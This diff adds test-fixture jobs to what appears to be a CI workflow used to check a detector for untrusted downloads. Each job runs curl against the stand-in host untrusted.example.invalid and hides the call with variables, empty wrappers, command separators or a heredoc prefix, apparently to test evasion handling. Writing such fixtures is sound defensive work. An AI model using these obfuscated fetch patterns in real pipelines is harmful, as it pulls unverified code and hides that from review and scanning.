@@ -35,3 +35,19 @@ jobs:
         run: curl "https://untrusted.example.invalid/tool-${VERSION}.sha256" -o latest.tgz
       - name: mixed-literal-and-dynamic-url-command
         run: curl -fsSL https://untrusted.example.invalid/literal.tgz "$DYNAMIC_URL" -o mixed.tgz
+      - name: literal-command-separators
+        run: |
+          FETCH='echo setup; curl'
+          $FETCH https://untrusted.example.invalid/separator.tgz
+      - name: unicode-non-url-operand
+        run: curl 漢字漢
+      - name: elided-wrapper-command
+        run: |
+          WRAP=''
+          $WRAP curl -fsSL https://untrusted.example.invalid/elided.tgz
+      - name: heredoc-command-prefix
+        run: |
+          FETCH='curl -fsSL https://untrusted.example.invalid/heredoc-prefix.tgz <<EOF'
+          $FETCH
+          payload
+          EOF
